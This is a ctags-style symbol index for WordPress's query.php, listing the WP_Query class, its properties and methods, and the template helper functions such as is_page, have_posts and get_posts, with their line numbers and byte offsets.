 * After looping through a separate query, this function restoresrestores112,2351
function wp_reset_postdata() {wp_reset_postdata118,2517
function is_archive() {is_archive141,2901
function is_post_type_archive( $post_types = '' ) {is_post_type_archive162,3424
function is_post_type_archive( $post_types = '' ) {post_types162,3424
function is_attachment() {is_attachment182,3895
 * If the $author parameter is specified, this function will additionallywill196,4233
function is_author( $author = '' ) {is_author206,4567
function is_author( $author = '' ) {author206,4567
 * If the $category parameter is specified, this function will additionallywill220,4921
function is_category( $category = '' ) {is_category230,5257
function is_category( $category = '' ) {category230,5257
 * If the $tag parameter is specified, this function will additionallywill244,5614
function is_tag( $slug = '' ) {is_tag254,5889
function is_tag( $slug = '' ) {slug254,5889
 * If the $taxonomy parameter is specified, this function will additionallywill268,6233
 * this function will additionally check if the query is for one of the termswill272,6445
function is_tax( $taxonomy = '', $term = '' ) {is_tax283,6777
function is_tax( $taxonomy = '', $term = '' ) {taxonomy283,6777
function is_comments_popup() {is_comments_popup303,7263
function is_date() {is_date323,7687
function is_day() {is_day343,8089
function is_feed( $feeds = '' ) {is_feed364,8543
function is_feed( $feeds = '' ) {feeds364,8543
function is_comment_feed() {is_comment_feed384,8978
 * If you set a static page for the front page of your site, this function will returnwill402,9489
function is_front_page() {is_front_page414,9792
 * If you set a static page for the front page of your site, this function will returnwill432,10307
function is_home() {is_home443,10592
function is_month() {is_month463,10998
 * If the $page parameter is specified, this function will additionallywill477,11317
function is_page( $page = '' ) {is_page490,11642
function is_page( $page = '' ) {page490,11642
function is_paged() {is_paged510,12091
function is_preview() {is_preview530,12508
function is_robots() {is_robots550,12921
function is_search() {is_search570,13325
 * If the $post parameter is specified, this function will additionallywill586,13706
function is_single( $post = '' ) {is_single599,14031
function is_single( $post = '' ) {post599,14031
 * If the $post_types parameter is specified, this function will additionallywill613,14419
function is_singular( $post_types = '' ) {is_singular626,14765
function is_singular( $post_types = '' ) {post_types626,14765
function is_time() {is_time646,15209
function is_trackback() {is_trackback666,15629
function is_year() {is_year686,16044
function is_404() {is_404706,16455
function is_main_query() {is_main_query724,16806
function have_posts() {have_posts742,17088
function in_the_loop() {in_the_loop756,17341
function rewind_posts() {rewind_posts771,17545
function the_post() {the_post784,17743
function have_comments() {have_comments803,17981
function the_comment() {the_comment817,18211
class WP_Query {WP_Query833,18448
	var $query;query842,18562
	var $query_vars = array();query_vars851,18671
	var $query_vars = array();query_vars851,18671
	var $tax_query;tax_query860,18826
	var $meta_query = false;meta_query869,18953
	var $meta_query = false;meta_query869,18953
	var $queried_object;queried_object880,19174
	var $queried_object_id;queried_object_id889,19294
	var $request;request898,19415
	var $posts;posts907,19515
	var $post_count = 0;post_count916,19639
	var $post_count = 0;post_count916,19639
	var $current_post = -1;current_post925,19768
	var $current_post = -1;current_post925,19768
	var $in_the_loop = false;in_the_loop934,19922
	var $in_the_loop = false;in_the_loop934,19922
	var $post;post943,20041
	var $comments;comments952,20162
	var $comment_count = 0;comment_count961,20284
	var $comment_count = 0;comment_count961,20284
	var $current_comment = -1;current_comment970,20423
	var $current_comment = -1;current_comment970,20423
	var $comment;comment979,20539
	var $found_posts = 0;found_posts988,20668
	var $found_posts = 0;found_posts988,20668
	var $max_num_pages = 0;max_num_pages997,20780
	var $max_num_pages = 0;max_num_pages997,20780
	var $max_num_comment_pages = 0;max_num_comment_pages1006,20902
	var $max_num_comment_pages = 0;max_num_comment_pages1006,20902
	var $is_single = false;is_single1015,21033
	var $is_single = false;is_single1015,21033
	var $is_preview = false;is_preview1024,21160
	var $is_preview = false;is_preview1024,21160
	var $is_page = false;is_page1033,21284
	var $is_page = false;is_page1033,21284
	var $is_archive = false;is_archive1042,21409
	var $is_archive = false;is_archive1042,21409
	var $is_date = false;is_date1051,21536
	var $is_date = false;is_date1051,21536
	var $is_year = false;is_year1060,21658
	var $is_year = false;is_year1060,21658
	var $is_month = false;is_month1069,21781
	var $is_month = false;is_month1069,21781
	var $is_day = false;is_day1078,21903
	var $is_day = false;is_day1078,21903
	var $is_time = false;is_time1087,22022
	var $is_time = false;is_time1087,22022
	var $is_author = false;is_author1096,22147
	var $is_author = false;is_author1096,22147
	var $is_category = false;is_category1105,22273
	var $is_category = false;is_category1105,22273
	var $is_tag = false;is_tag1114,22396
	var $is_tag = false;is_tag1114,22396
	var $is_tax = false;is_tax1123,22519
	var $is_tax = false;is_tax1123,22519
	var $is_search = false;is_search1132,22652
	var $is_search = false;is_search1132,22652
	var $is_feed = false;is_feed1141,22776
	var $is_feed = false;is_feed1141,22776
	var $is_comment_feed = false;is_comment_feed1150,22906
	var $is_comment_feed = false;is_comment_feed1150,22906
	var $is_trackback = false;is_trackback1159,23033
	var $is_trackback = false;is_trackback1159,23033
	var $is_home = false;is_home1168,23161
	var $is_home = false;is_home1168,23161
	var $is_404 = false;is_4041177,23291
	var $is_404 = false;is_4041177,23291
	var $is_comments_popup = false;is_comments_popup1186,23428
	var $is_comments_popup = false;is_comments_popup1186,23428
	var $is_paged = false;is_paged1195,23552
	var $is_paged = false;is_paged1195,23552
	var $is_admin = false;is_admin1204,23690
	var $is_admin = false;is_admin1204,23690
	var $is_attachment = false;is_attachment1213,23814
	var $is_attachment = false;is_attachment1213,23814
	var $is_singular = false;is_singular1222,23962
	var $is_singular = false;is_singular1222,23962
	var $is_robots = false;is_robots1231,24086
	var $is_robots = false;is_robots1231,24086
	var $is_posts_page = false;is_posts_page1242,24290
	var $is_posts_page = false;is_posts_page1242,24290
	var $is_post_type_archive = false;is_post_type_archive1251,24429
	var $is_post_type_archive = false;is_post_type_archive1251,24429
	var $query_vars_hash = false;query_vars_hash1260,24666
	var $query_vars_hash = false;query_vars_hash1260,24666
	var $query_vars_changed = true;query_vars_changed1269,24899
	var $query_vars_changed = true;query_vars_changed1269,24899
	 var $thumbnails_cached = false;thumbnails_cached1278,25035
	 var $thumbnails_cached = false;thumbnails_cached1278,25035
	function init_query_flags() {init_query_flags1288,25231
		$this->is_single = false;is_single1289,25262
		$this->is_preview = false;is_preview1290,25290
		$this->is_page = false;is_page1291,25319
		$this->is_archive = false;is_archive1292,25345
		$this->is_date = false;is_date1293,25374
		$this->is_year = false;is_year1294,25400
		$this->is_month = false;is_month1295,25426
		$this->is_day = false;is_day1296,25453
		$this->is_time = false;is_time1297,25478
		$this->is_author = false;is_author1298,25504
		$this->is_category = false;is_category1299,25532
		$this->is_tag = false;is_tag1300,25562
		$this->is_tax = false;is_tax1301,25587
		$this->is_search = false;is_search1302,25612
		$this->is_feed = false;is_feed1303,25640
		$this->is_comment_feed = false;is_comment_feed1304,25666
		$this->is_trackback = false;is_trackback1305,25700
		$this->is_home = false;is_home1306,25731
		$this->is_404 = false;is_4041307,25757
		$this->is_comments_popup = false;is_comments_popup1308,25782
		$this->is_paged = false;is_paged1309,25818
		$this->is_admin = false;is_admin1310,25845
		$this->is_attachment = false;is_attachment1311,25872
		$this->is_singular = false;is_singular1312,25904
		$this->is_robots = false;is_robots1313,25934
		$this->is_posts_page = false;is_posts_page1314,25962
		$this->is_post_type_archive = false;is_post_type_archive1315,25994
	function init() {init1324,26144
		$this->query_vars = array();query_vars1327,26209
		$this->post_count = 0;post_count1330,26307
		$this->current_post = -1;current_post1331,26332
		$this->in_the_loop = false;in_the_loop1332,26360
		$this->comment_count = 0;comment_count1337,26496
		$this->current_comment = -1;current_comment1338,26524
		$this->found_posts = 0;found_posts1339,26555
		$this->max_num_pages = 0;max_num_pages1340,26581
		$this->max_num_comment_pages = 0;max_num_comment_pages1341,26609
	function parse_query_vars() {parse_query_vars1352,26757
	function fill_query_vars($array) {fill_query_vars1365,27074
		$keys = array(keys1366,27110
		$array_keys = array('category__in', 'category__not_in', 'category__and', 'post__in', 'post__not_in',array_keys1408,27708
	function parse_query( $query =  '' ) {parse_query1426,28162
	function parse_query( $query =  '' ) {query1426,28162
			$this->query = $this->query_vars = wp_parse_args( $query );query1429,28249
			$this->query = $this->query_vars;query1431,28353
		$this->query_vars = $this->fill_query_vars($this->query_vars);query_vars1434,28395
		$qv = &$this->query_vars;qv1435,28460
		$this->query_vars_changed = true;query_vars_changed1436,28488
			$this->is_robots = true;is_robots1439,28557
			$this->is_single = true;is_single1465,29595
			$this->is_attachment = true;is_attachment1466,29623
			$this->is_single = true;is_single1468,29690
			$this->is_single = true;is_single1470,29744
			$this->is_single = true;is_single1474,30032
			$this->is_page = true;is_page1476,30148
			$this->is_single = false;is_single1477,30174
				$this->is_search = true;is_search1482,30331
				$this->is_time = true;is_time1486,30399
				$this->is_date = true;is_date1487,30426
				$this->is_time = true;is_time1491,30492
				$this->is_date = true;is_date1492,30519
				$this->is_time = true;is_time1496,30583
				$this->is_date = true;is_date1497,30610
					$this->is_day = true;is_day1502,30696
					$this->is_date = true;is_date1503,30723
					$this->is_month = true;is_month1509,30821
					$this->is_date = true;is_date1510,30850
					$this->is_year = true;is_year1516,30944
					$this->is_date = true;is_date1517,30972
				$this->is_date = true;is_date1522,31033
					$this->is_time = true;is_time1524,31094
					$this->is_day = true;is_day1526,31163
					$this->is_month = true;is_month1528,31231
					$this->is_year = true;is_year1530,31273
				$this->is_date = true;is_date1535,31340
			$this->query_vars_hash = false;query_vars_hash1538,31373
							$this->is_category = true;is_category1545,31612
							$this->is_tag = true;is_tag1548,31683
							$this->is_tax = true;is_tax1551,31741
				$this->is_author = false;is_author1558,31872
				$this->is_author = true;is_author1560,31914
				$this->is_author = true;is_author1564,31984
				$post_type_obj = get_post_type_object( $qv['post_type'] );post_type_obj1567,32087
					$this->is_post_type_archive = true;is_post_type_archive1569,32200
				$this->is_archive = true;is_archive1573,32379
			$this->is_feed = true;is_feed1577,32441
			$this->is_trackback = true;is_trackback1580,32493
			$this->is_paged = true;is_paged1583,32585
			$this->is_comments_popup = true;is_comments_popup1586,32650
			$this->is_preview = true;is_preview1590,32766
			$this->is_admin = true;is_admin1593,32816
		$this->is_singular = $this->is_single || $this->is_page || $this->is_attachment;is_singular1600,32991
			$this->is_comment_feed = true;is_comment_feed1603,33193
			$this->is_home = true;is_home1606,33427
			$_query = wp_parse_args($this->query);_query1610,33607
				$this->is_page = true;is_page1615,33954
				$this->is_home = false;is_home1616,33981
			$this->queried_object = get_page_by_path($qv['pagename']);queried_object1627,34250
				$this->queried_object_id = (int) $this->queried_object->ID;queried_object_id1629,34352
			if  ( 'page' == get_option('show_on_front') && isset($this->queried_object_id) && $this->queried_object_id == get_option('page_for_posts') ) {queried_object_id1633,34459
				$this->is_page = false;is_page1634,34605
				$this->is_home = true;is_home1635,34633
				$this->is_posts_page = true;is_posts_page1636,34660
				$this->is_page = false;is_page1642,34830
				$this->is_home = true;is_home1643,34858
				$this->is_posts_page = true;is_posts_page1644,34885
			$this->is_comment_feed = false;is_comment_feed1663,35476
		$this->is_singular = $this->is_single || $this->is_page || $this->is_attachment;is_singular1665,35512
		$this->query_vars_hash = md5( serialize( $this->query_vars ) );query_vars_hash1671,35712
		$this->query_vars_changed = false;query_vars_changed1672,35778
	function parse_tax_query( &$q ) {parse_tax_query1685,36018
			$tax_query = $q['tax_query'];tax_query1687,36122
			$tax_query = array();tax_query1689,36166
		foreach ( $GLOBALS['wp_taxonomies'] as $taxonomy => $t ) {taxonomy1700,36381
				$tax_query_defaults = array(tax_query_defaults1705,36595
				$term = $q[$t->query_var];term1714,36838
					$terms = preg_split( '/[+]+/', $term );terms1717,36912
			$cat_array = preg_split('/[,\s]+/', $q['cat']);cat_array1735,37458
			$req_cats = array();req_cats1737,37528
				$cat = intval($cat);cat1739,37596
				$in = ($cat > 0);in1741,37645
				$cat = abs($cat);cat1742,37667
				$tags = preg_split('/[,\s]+/', $q['tag']);tags1788,39098
					$tag = sanitize_term_field('slug', $tag, 0, 'post_tag', 'db');tag1790,39185
				$tags = preg_split('/[+\s]+/', $q['tag']);tags1794,39367
					$tag = sanitize_term_field('slug', $tag, 0, 'post_tag', 'db');tag1796,39454
		$this->tax_query = new WP_Tax_Query( $tax_query );tax_query1858,41132
	function set_404() {set_4041867,41298
		$is_feed = $this->is_feed;is_feed1868,41320
		$this->is_404 = true;is_4041871,41379
		$this->is_feed = $is_feed;is_feed1873,41404
	function get($query_var) {get1885,41587
	function set($query_var, $value) {set1901,41893
	function &get_posts() {get_posts1917,42295
		$q = &$this->query_vars;q1925,42473
		$q = $this->fill_query_vars($q);q1928,42556
		$this->meta_query = new WP_Meta_Query();meta_query1931,42614
		$hash = md5( serialize( $this->query_vars ) );hash1935,42767
			$this->query_vars_changed = true;query_vars_changed1937,42859
			$this->query_vars_hash = $hash;query_vars_hash1938,42896
		$distinct = '';distinct1943,42990
		$whichauthor = '';whichauthor1944,43008
		$whichmimetype = '';whichmimetype1945,43029
		$where = '';where1946,43052
		$limits = '';limits1947,43067
		$join = '';join1948,43083
		$search = '';search1949,43097
		$groupby = '';groupby1950,43113
		$fields = '';fields1951,43130
		$post_status_join = false;post_status_join1952,43146
		$page = 1;page1953,43175
		$post_type = $q['post_type'];post_type1986,44081
			$this->is_page = true;is_page2016,45325
			$this->is_home = false;is_home2017,45351
				$fields = "$wpdb->posts.ID";fields2034,45795
				$fields = "$wpdb->posts.ID, $wpdb->posts.post_parent";fields2037,45861
				$fields = "$wpdb->posts.*";fields2040,45943
				$ptype_obj = get_post_type_object($_post_type);ptype_obj2080,47521
				$reqpage = $this->queried_object_id;reqpage2104,48455
						$ptype_obj = get_post_type_object($_post_type);ptype_obj2108,48604
						$reqpage = get_page_by_path($q['pagename'], OBJECT, $_post_type);reqpage2112,48730
					$reqpage = get_page_by_path($q['pagename']);reqpage2118,48882
					$reqpage = $reqpage->ID;reqpage2121,48966
					$reqpage = 0;reqpage2123,49005
			$page_for_posts = get_option('page_for_posts');page_for_posts2126,49030
				$reqpage_obj = get_page($reqpage);reqpage_obj2131,49362
					$this->is_attachment = true;is_attachment2133,49481
					$post_type = $q['post_type'] = 'attachment';post_type2134,49515
					$this->is_page = true;is_page2135,49565
			$post__in = implode(',', array_map( 'absint', $q['post__in'] ));post__in2159,50378
			$post__not_in = implode(',',  array_map( 'absint', $q['post__not_in'] ));post__not_in2162,50536
				$where = " AND {$wpdb->posts}.ID = " . $q['page_id'];where2172,50970
			$n = !empty($q['exact']) ? '' : '%';n2186,51497
			$searchand = '';searchand2187,51537
				$term = esc_sql( like_escape( $term ) );term2189,51609
				$searchand = ' AND ';searchand2191,51789
				$search = " AND ({$search}) ";search2195,51849
		$search = apply_filters_ref_array('posts_search', array( $search, &$this ) );search2202,52079
			$clauses = $this->tax_query->get_sql( $wpdb->posts, 'ID' );clauses2208,52241
				$post_type = 'any';post_type2216,52427
				$post_status_join = true;post_status_join2217,52451
				$post_status_join = true;post_status_join2219,52542
			$tax_query_in_and = wp_list_filter( $this->tax_query->queries, array( 'operator' => 'NOT IN' ), 'NOT' );tax_query_in_and2225,52644
				$cat_query = wp_list_filter( $tax_query_in_and, array( 'taxonomy' => 'category' ) );cat_query2241,53211
					$cat_query = reset( $cat_query );cat_query2243,53334
					$the_cat = get_term_by( $cat_query['field'], $cat_query['terms'][0], 'category' );the_cat2244,53373
				$tag_query = wp_list_filter( $tax_query_in_and, array( 'taxonomy' => 'post_tag' ) );tag_query2253,53646
					$tag_query = reset( $tag_query );tag_query2255,53769
					$the_tag = get_term_by( $tag_query['field'], $tag_query['terms'][0], 'post_tag' );the_tag2256,53808
			$groupby = "{$wpdb->posts}.ID";groupby2267,54127
			$whichauthor = '';whichauthor2273,54247
				$eq = '!=';eq2278,54427
				$andor = 'AND';andor2279,54443
				$eq = '=';eq2283,54574
				$andor = 'OR';andor2284,54589
			$author_array = preg_split('/[,\s]+/', $q['author']);author_array2286,54613
			$_author_array = array();_author_array2287,54670
			foreach ( $author_array as $key => $_author )key2288,54699
			$whichmimetype = wp_post_mime_type_where( $q['post_mime_type'], $wpdb->posts );whichmimetype2315,55801
			$orderby = "$wpdb->posts.post_date " . $q['order'];orderby2324,56118
			$orderby = '';orderby2326,56214
			$allowed_keys = array('name', 'author', 'date', 'title', 'modified', 'menu_order', 'parent', 'ID', 'rand', 'comment_count');allowed_keys2329,56271
			$orderby_array = array();orderby_array2338,56649
			foreach ( explode( ' ', $q['orderby'] ) as $i => $orderby ) {i2339,56678
						$orderby = "$wpdb->posts.menu_order";orderby2346,56900
						$orderby = "$wpdb->posts.ID";orderby2349,56973
						$orderby = 'RAND()';orderby2352,57040
						$orderby = "$wpdb->postmeta.meta_value";orderby2356,57130
						$orderby = "$wpdb->postmeta.meta_value+0";orderby2359,57218
						$orderby = "$wpdb->posts.comment_count";orderby2362,57307
						$orderby = "$wpdb->posts.post_" . $orderby;orderby2365,57381
			$orderby = implode( ',', $orderby_array );orderby2370,57476
				$orderby = "$wpdb->posts.post_date ".$q['order'];orderby2373,57551
			$post_type_cap = 'multiple_post_type';post_type_cap2379,57686
			$post_type_object = get_post_type_object( $post_type );post_type_object2381,57739
				$post_type_cap = $post_type;post_type_cap2383,57835
			$in_search_post_types = get_post_types( array('exclude_from_search' => false) );in_search_post_types2387,57904
			$post_type_object = get_post_type_object ( $post_type );post_type_object2394,58390
			$post_type_object = get_post_type_object ( 'attachment' );post_type_object2397,58547
			$post_type_object = get_post_type_object ( 'page' );post_type_object2400,58694
			$post_type_object = get_post_type_object ( 'post' );post_type_object2403,58814
			$edit_cap = $post_type_object->cap->edit_post;edit_cap2407,58915
			$read_cap = $post_type_object->cap->read_post;read_cap2408,58965
			$edit_others_cap = $post_type_object->cap->edit_others_posts;edit_others_cap2409,59015
			$read_private_cap = $post_type_object->cap->read_private_posts;read_private_cap2410,59080
			$edit_cap = 'edit_' . $post_type_cap;edit_cap2412,59158
			$read_cap = 'read_' . $post_type_cap;read_cap2413,59199
			$edit_others_cap = 'edit_others_' . $post_type_cap . 's';edit_others_cap2414,59240
			$read_private_cap = 'read_private_' . $post_type_cap . 's';read_private_cap2415,59301
			$statuswheres = array();statuswheres2419,59409
			$q_status = $q['post_status'];q_status2420,59437
				$q_status = explode(',', $q_status);q_status2422,59505
			$r_status = array();r_status2423,59546
			$p_status = array();p_status2424,59570
			$e_status = array();e_status2425,59594
				$r_status = array_merge($r_status, $p_status);r_status2441,60147
				foreach ( $statuswheres as $index => $statuswhere )index2462,61065
			$public_states = get_post_stati( array('public' => true) );public_states2471,61475
				$admin_all_states = get_post_stati( array('protected' => true, 'show_in_admin_all_list' => true) );admin_all_states2480,61825
				$private_states = get_post_stati( array('private' => true) );private_states2487,62203
			$clauses = $this->meta_query->get_sql( 'post', $wpdb->posts, 'ID', $this );clauses2496,62578
			$where = apply_filters_ref_array('posts_where', array( $where, &$this ) );where2504,62895
			$join = apply_filters_ref_array('posts_join', array( $join, &$this ) );join2505,62973
			$page = absint($q['paged']);page2510,63121
				$page = 1;page2512,63170
				$pgstrt = ($page - 1) * $q['posts_per_page'] . ', ';pgstrt2515,63218
				$pgstrt = $q['offset'] . ', ';pgstrt2518,63371
			$limits = 'LIMIT ' . $pgstrt . $q['posts_per_page'];limits2520,63411
				$cjoin = "JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID) $join ";cjoin2526,63644
				$cwhere = "WHERE comment_approved = '1' $where";cwhere2527,63740
				$cgroupby = "$wpdb->comments.comment_id";cgroupby2528,63793
				$cjoin = "JOIN $wpdb->posts ON ( $wpdb->comments.comment_post_ID = $wpdb->posts.ID )";cjoin2530,63884
				$cwhere = "WHERE post_status = 'publish' AND comment_approved = '1'";cwhere2531,63975
				$cgroupby = '';cgroupby2532,64049
				$cjoin = apply_filters_ref_array('comment_feed_join', array( $cjoin, &$this ) );cjoin2536,64111
				$cwhere = apply_filters_ref_array('comment_feed_where', array( $cwhere, &$this ) );cwhere2537,64196
				$cgroupby = apply_filters_ref_array('comment_feed_groupby', array( $cgroupby, &$this ) );cgroupby2538,64284
				$corderby = apply_filters_ref_array('comment_feed_orderby', array( 'comment_date_gmt DESC', &$this ) );corderby2539,64378
				$climits = apply_filters_ref_array('comment_feed_limits', array( 'LIMIT ' . get_option('posts_per_rss'), &$this ) );climits2540,64486
			$cgroupby = ( ! empty( $cgroupby ) ) ? 'GROUP BY ' . $cgroupby : '';cgroupby2542,64612
			$corderby = ( ! empty( $corderby ) ) ? 'ORDER BY ' . $corderby : '';corderby2543,64684
			$this->comments = (array) $wpdb->get_results("SELECT $distinct $wpdb->comments.* FROM $wpdb->comments $cjoin $cwhere $cgroupby $corderby $climits");comments2545,64757
			$this->comment_count = count($this->comments);comment_count2546,64909
			$post_ids = array();post_ids2548,64960
			$post_ids = join(',', $post_ids);post_ids2553,65080
			$join = '';join2554,65117
				$where = "AND $wpdb->posts.ID IN ($post_ids) ";where2556,65152
				$where = "AND 0";where2558,65212
		$pieces = array( 'where', 'groupby', 'join', 'orderby', 'distinct', 'fields', 'limits' );pieces2561,65239
			$where		= apply_filters_ref_array( 'posts_where_paged',	array( $where, &$this ) );where2566,65490
			$groupby	= apply_filters_ref_array( 'posts_groupby',		array( $groupby, &$this ) );groupby2567,65576
			$join		= apply_filters_ref_array( 'posts_join_paged',	array( $join, &$this ) );join2568,65662
			$orderby	= apply_filters_ref_array( 'posts_orderby',		array( $orderby, &$this ) );orderby2569,65745
			$distinct	= apply_filters_ref_array( 'posts_distinct',	array( $distinct, &$this ) );distinct2570,65831
			$limits		= apply_filters_ref_array( 'post_limits',		array( $limits, &$this ) );limits2571,65919
			$fields		= apply_filters_ref_array( 'posts_fields',		array( $fields, &$this ) );fields2572,66002
			$clauses = (array) apply_filters_ref_array( 'posts_clauses', array( compact( $pieces ), &$this ) );clauses2575,66137
			$where		= apply_filters_ref_array( 'posts_where_request',		array( $where, &$this ) );where2585,66635
			$groupby	= apply_filters_ref_array( 'posts_groupby_request',		array( $groupby, &$this ) );groupby2586,66724
			$join		= apply_filters_ref_array( 'posts_join_request',		array( $join, &$this ) );join2587,66818
			$orderby	= apply_filters_ref_array( 'posts_orderby_request',		array( $orderby, &$this ) );orderby2588,66904
			$distinct	= apply_filters_ref_array( 'posts_distinct_request',	array( $distinct, &$this ) );distinct2589,66998
			$fields		= apply_filters_ref_array( 'posts_fields_request',		array( $fields, &$this ) );fields2590,67094
			$limits		= apply_filters_ref_array( 'post_limits_request',		array( $limits, &$this ) );limits2591,67186
			$clauses = (array) apply_filters_ref_array( 'posts_clauses_request', array( compact( $pieces ), &$this ) );clauses2594,67328
			$groupby = 'GROUP BY ' . $groupby;groupby2600,67573
			$orderby = 'ORDER BY ' . $orderby;orderby2602,67639
		$found_rows = '';found_rows2604,67678
			$found_rows = 'SQL_CALC_FOUND_ROWS';found_rows2606,67747
		$this->request = $old_request = "SELECT $found_rows $distinct $fields FROM $wpdb->posts $join WHERE 1=1 $where $groupby $orderby $limits";request2608,67788
			$this->request = apply_filters_ref_array( 'posts_request', array( $this->request, &$this ) );request2611,67965
			$this->posts = $wpdb->get_col($this->request);posts2615,68100
			$this->posts = $wpdb->get_results($this->request);posts2621,68220
			$r = array();r2623,68275
		$split_the_query = ( $old_request == $this->request && "$wpdb->posts.*" == $fields && !empty( $limits ) && $q['posts_per_page'] < 500 );split_the_query2630,68391
		$split_the_query = apply_filters( 'split_the_query', $split_the_query, $this );split_the_query2631,68530
			$this->request = "SELECT $found_rows $distinct $wpdb->posts.ID FROM $wpdb->posts $join WHERE 1=1 $where $groupby $orderby $limits";request2636,68695
			$this->request = apply_filters( 'posts_request_ids', $this->request, $this );request2638,68831
			$ids = $wpdb->get_col( $this->request );ids2640,68913
				$this->posts = array_map( 'get_post', $ids );posts2647,69112
				$this->found_posts = $this->max_num_pages = 0;found_posts2649,69174
				$this->posts = array();posts2650,69225
			$this->posts = $wpdb->get_results( $this->request );posts2653,69269
			$this->posts = apply_filters_ref_array('posts_results', array( $this->posts, &$this ) );posts2659,69454
			$cjoin = apply_filters_ref_array('comment_feed_join', array( '', &$this ) );cjoin2662,69627
			$cwhere = apply_filters_ref_array('comment_feed_where', array( "WHERE comment_post_ID = '{$this->posts[0]->ID}' AND comment_approved = '1'", &$this ) );cwhere2663,69707
			$cgroupby = apply_filters_ref_array('comment_feed_groupby', array( '', &$this ) );cgroupby2664,69863
			$cgroupby = ( ! empty( $cgroupby ) ) ? 'GROUP BY ' . $cgroupby : '';cgroupby2665,69949
			$corderby = apply_filters_ref_array('comment_feed_orderby', array( 'comment_date_gmt DESC', &$this ) );corderby2666,70021
			$corderby = ( ! empty( $corderby ) ) ? 'ORDER BY ' . $corderby : '';corderby2667,70128
			$climits = apply_filters_ref_array('comment_feed_limits', array( 'LIMIT ' . get_option('posts_per_rss'), &$this ) );climits2668,70200
			$comments_request = "SELECT $wpdb->comments.* FROM $wpdb->comments $cjoin $cwhere $cgroupby $corderby $climits";comments_request2669,70320
			$this->comments = $wpdb->get_results($comments_request);comments2670,70436
			$this->comment_count = count($this->comments);comment_count2671,70496
			$status = get_post_status($this->posts[0]);status2676,70688
			$post_status_obj = get_post_status_object($status);post_status_obj2677,70735
					$this->posts = array();posts2682,70966
							$this->posts = array();posts2687,71183
							$this->is_preview = true;is_preview2689,71229
							$this->posts = array();posts2695,71474
						$this->posts = array();posts2697,71519
		$sticky_posts = get_option('sticky_posts');sticky_posts2707,71819
			$num_posts = count($this->posts);num_posts2709,71987
			$sticky_offset = 0;sticky_offset2710,72024
			for ( $i = 0; $i < $num_posts; $i++ ) {i2712,72105
					$sticky_post = $this->posts[$i];sticky_post2714,72207
					$offset = array_search($sticky_post->ID, $sticky_posts);offset2722,72597
				$sticky_posts = array_diff($sticky_posts, $q['post__not_in']);sticky_posts2729,72853
				$stickies__in = implode(',', array_map( 'absint', $sticky_posts ));stickies__in2733,73014
				$stickies_where = '';stickies_where2735,73130
						$post_types = join( "', '", $post_type );post_types2738,73246
						$post_types = $post_type;post_types2740,73308
					$stickies_where = "AND $wpdb->posts.post_type IN ('" . $post_types . "')";stickies_where2742,73347
				$stickies = $wpdb->get_results( "SELECT * FROM $wpdb->posts WHERE $wpdb->posts.ID IN ($stickies__in) $stickies_where" );stickies2745,73434
			$this->posts = apply_filters_ref_array('the_posts', array( $this->posts, &$this ) );posts2757,73894
		$this->post_count = count($this->posts);post_count2759,73983
		foreach ( $this->posts as $i => $post ) {i2762,74048
			$this->post = $this->posts[0];post2770,74322
	function set_found_posts( $q, $limits ) {set_found_posts2776,74388
		$this->found_posts = $wpdb->get_var( apply_filters_ref_array( 'found_posts_query', array( 'SELECT FOUND_ROWS()', &$this ) ) );found_posts2782,74509
		$this->found_posts = apply_filters_ref_array( 'found_posts', array( $this->found_posts, &$this ) );found_posts2783,74638
		$this->max_num_pages = ceil( $this->found_posts / $q['posts_per_page'] );max_num_pages2785,74741
	function next_post() {next_post2796,74962
		$this->post = $this->posts[$this->current_post];post2800,75013
	function the_post() {the_post2815,75358
		$this->in_the_loop = true;in_the_loop2817,75397
		if ( $this->current_post == -1 ) // loop has just startedcurrent_post2819,75427
		$post = $this->next_post();post2822,75541
	function have_posts() {have_posts2837,75904
		$this->in_the_loop = false;in_the_loop2846,76210
	function rewind_posts() {rewind_posts2856,76353
		$this->current_post = -1;current_post2857,76380
			$this->post = $this->posts[0];post2859,76441
	function next_comment() {next_comment2871,76633
		$this->comment = $this->comments[$this->current_comment];comment2874,76689
	function the_comment() {the_comment2886,76993
		$comment = $this->next_comment();comment2889,77039
		if ( $this->current_comment == 0 ) {current_comment2891,77076
	function have_comments() {have_comments2906,77380
	function rewind_comments() {rewind_comments2922,77729
		$this->current_comment = -1;current_comment2923,77759
			$this->comment = $this->comments[0];comment2925,77826
	function &query( $query ) {query2938,78061
		$this->query = $this->query_vars = wp_parse_args( $query );query2940,78107
	function get_queried_object() {get_queried_object2956,78518
		$this->queried_object = null;queried_object2960,78623
		$this->queried_object_id = 0;queried_object_id2961,78655
			$tax_query_in_and = wp_list_filter( $this->tax_query->queries, array( 'operator' => 'NOT IN' ), 'NOT' );tax_query_in_and2964,78752
			$query = reset( $tax_query_in_and );query2966,78861
				$term = get_term( reset( $query['terms'] ), $query['taxonomy'] );term2969,78941
				$term = get_term_by( $query['field'], reset( $query['terms'] ), $query['taxonomy'] );term2971,79019
				$this->queried_object = $term;queried_object2974,79153
				$this->queried_object_id = (int) $term->term_id;queried_object_id2975,79188
			$this->queried_object = get_post_type_object( $this->get('post_type') );queried_object2981,79370
			$page_for_posts = get_option('page_for_posts');page_for_posts2983,79484
			$this->queried_object = get_page( $page_for_posts );queried_object2984,79535
			$this->queried_object_id = (int) $this->queried_object->ID;queried_object_id2985,79591
			$this->queried_object = $this->post;queried_object2987,79715
			$this->queried_object_id = (int) $this->post->ID;queried_object_id2988,79755
			$this->queried_object_id = (int) $this->get('author');queried_object_id2990,79842
			$this->queried_object = get_userdata( $this->queried_object_id );queried_object2991,79900
	function get_queried_object_id() {get_queried_object_id3005,80127
	function __construct($query = '') {__construct3026,80494
	function is_archive() {is_archive3041,80748
	function is_post_type_archive( $post_types = '' ) {is_post_type_archive3053,81002
	function is_post_type_archive( $post_types = '' ) {post_types3053,81002
		$post_type_object = $this->get_queried_object();post_type_object3057,81164
	function is_attachment() {is_attachment3069,81380
	 * If the $author parameter is specified, this function will additionallywill3076,81504
	function is_author( $author = '' ) {is_author3084,81797
	function is_author( $author = '' ) {author3084,81797
		$author_obj = $this->get_queried_object();author_obj3091,81921
		$author = (array) $author;author3093,81967
	 * If the $category parameter is specified, this function will additionallywill3108,82284
	function is_category( $category = '' ) {is_category3116,82577
	function is_category( $category = '' ) {category3116,82577
		$cat_obj = $this->get_queried_object();cat_obj3123,82709
		$category = (array) $category;category3125,82752
	 * If the $tag parameter is specified, this function will additionallywill3140,83057
	function is_tag( $slug = '' ) {is_tag3148,83294
	function is_tag( $slug = '' ) {slug3148,83294
